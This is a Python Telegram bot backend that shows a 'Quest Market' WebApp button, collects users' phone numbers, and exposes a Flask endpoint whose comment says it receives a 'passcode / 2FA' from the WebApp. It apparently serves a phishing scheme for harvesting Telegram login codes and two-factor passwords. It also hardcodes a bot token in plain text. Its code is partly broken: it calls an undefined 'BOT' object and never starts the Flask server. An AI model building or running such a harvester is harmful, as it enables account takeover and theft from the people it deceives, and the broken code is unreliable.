import telebot
from flask import Flask, request, jsonify
import json
from telebot import types

TOKEN = "8501545065:AAGgYCuf0tOj-uc74hE9YlDJJJHojbKztrA"
WEBAPP_URL = "https://fairusss.github.io/tgbot/"

app = Flask(__name__)

bot = telebot.TeleBot(TOKEN)
# /start — показує кнопку з WebApp
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton(
            text="Відкрити WebApp",
            web_app=types.WebAppInfo(url=WEBAPP_URL)
        )
    )
    bot.send_message(
        message.chat.id,
        "Привіт! Натисни, щоб відкрити Quest Market:",
        reply_markup=markup
    )

# Отримання номера телефону з WebApp
@bot.message_handler(content_types=['contact'])
def handle_webapp_data(message):
    data = message.contact.phone_number

    print(data)
    bot.send_message(message.chat.id, f"Отримано номер: {data}")

# 🟢 AJAX endpoint — WebApp sends passcode / 2FA here
@app.route("/submit_data", methods=["POST"])
def submit_data():
    try:
        data = request.get_json()
        action = data.get("action")
        value = data.get("value")
        user_id = data.get("user_id")

        print(f"Received from WebApp: {action} = {value}")

        # Optionally send confirmation message to Telegram chat
        if user_id:
            BOT.send_message(user_id, f"✅ Got {action}: {value}")

        return jsonify(success=True, message="Data received"), 200
    except Exception as e:
        print("Error:", e)
        return jsonify(success=False, message=str(e)), 400


print("Бот запущено! Очікуємо дані...")



bot.infinity_polling()  